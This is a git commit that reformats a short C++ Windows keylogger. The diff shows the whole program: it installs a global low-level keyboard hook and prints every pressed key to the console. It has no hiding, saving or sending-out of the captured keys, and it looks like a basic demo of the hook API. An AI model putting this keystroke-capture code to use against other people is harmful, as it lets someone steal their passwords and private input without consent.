32a3fd8ca7b8fd028670f8eda2b69f452e1a157a
kpmcdowellmo <kpmcdowellmo@gmail.com>
2019-04-26 20:22:21 -0500

    Formatting code for keylogger using formatter

--- keylogger/keylogger.cpp
+++ keylogger/keylogger.cpp
@@ -7,25 +7,41 @@ HHOOK keyboard;
 KBDLLHOOKSTRUCT keyboardstruct;
 bool CapsStatus = false;
 
-LRESULT __stdcall Callback(int keyboardcode, WPARAM wParam, LPARAM lParam){
-    if (keyboardcode >= 0){
-        keyboardstruct = *((KBDLLHOOKSTRUCT*)lParam);
-        if (wParam == WM_KEYDOWN){
-            if (GetKeyState(16) < 0){
+LRESULT __stdcall Callback(int keyboardcode, WPARAM wParam, LPARAM lParam)
+{
+    if (keyboardcode >= 0)
+    {
+        keyboardstruct = *((KBDLLHOOKSTRUCT *)lParam);
+        if (wParam == WM_KEYDOWN)
+        {
+            if (GetKeyState(16) < 0)
+            {
                 char c = MapVirtualKey(keyboardstruct.vkCode, 2);
-                cout << (char)toupper(c) << endl;}
-            else{
+                cout << (char)toupper(c) << endl;
+            }
+            else
+            {
                 char c = MapVirtualKey(keyboardstruct.vkCode, 2);
-                cout << (char)tolower(c) << endl;}}}
-    return CallNextHookEx(keyboard, keyboardcode, wParam, lParam);}
+                cout << (char)tolower(c) << endl;
+            }
+        }
+    }
+    return CallNextHookEx(keyboard, keyboardcode, wParam, lParam);
+}
 
-void CreateHook(){
-    keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, Callback, NULL, 0);}
+void CreateHook()
+{
+    keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, Callback, NULL, 0);
+}
 
-int WINAPI WinMain(HINSTANCE hinstance1, HINSTANCE hinstance2, LPSTR lpstr,int cmd){
+int WINAPI WinMain(HINSTANCE hinstance1, HINSTANCE hinstance2, LPSTR lpstr, int cmd)
+{
     CreateHook();
     MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)){
+    while (GetMessage(&msg, NULL, 0, 0))
+    {
         TranslateMessage(&msg);
-        DispatchMessage(&msg);}
-    return msg.wParam;}
+        DispatchMessage(&msg);
+    }
+    return msg.wParam;
+}
